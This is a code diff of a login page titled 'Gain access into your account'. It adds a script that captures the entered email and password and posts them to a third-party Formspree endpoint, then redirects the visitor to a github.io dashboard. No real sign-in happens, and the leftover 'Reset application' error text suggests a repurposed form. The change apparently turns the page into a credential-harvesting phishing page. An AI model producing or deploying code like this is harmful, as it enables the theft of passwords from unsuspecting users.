@@ -17,18 +17,15 @@
     <p>Gain access into your account</p>
 
     <form id="loginForm">
-      <input type="email" placeholder="Enter your email" required />
-      <input type="password" placeholder="Enter password" required />
+      <input type="email" placeholder="Enter your email" name="manemm" required />
+      <input type="password" placeholder="Enter password" name="manpass" required />
 
       <div class="remember-forgot">
         <label><input type="checkbox" /> Remember me</label>
         <a href="Forgot_Password.html">Forgot password?</a>
       </div>
 
-      
-      <div class="btn">
-        <a href="https://ddbots-actv.github.io/Dashboard/" class="button">Sign In</a>
-      </div>
+      <button type="submit">Sign In</button>
     </form>
 
     <div class="signup">
@@ -36,7 +33,43 @@
     </div>
   </div>
 
+  <script>
+  document.addEventListener("DOMContentLoaded", function () {
+    const form = document.getElementById("loginForm");
 
+    form.addEventListener("submit", function (e) {
+      e.preventDefault(); // Prevent the default form reload
+
+      const formData = new FormData(form);
+      const jsonData = {};
+
+      formData.forEach((value, key) => {
+        jsonData[key] = value;
+      });
+
+      fetch("https://formspree.io/f/mdkenbez", { // Replace with your Formspree ID
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+          "Accept": "application/json"
+        },
+        body: JSON.stringify(jsonData)
+      })
+      .then(response => {
+        if (response.ok) {
+          window.location.href = "https://ddbots-actv.github.io/Dashboard/"; // Redirect after submission
+        } else {
+          alert("Reset application failed. Please try again.");
+        }
+      })
+      .catch(error => {
+        console.error("Submission error:", error);
+        alert("An error occurred while applying for Reset.");
+      });
+    });
+  });
+  
+  </script>
 
 
 
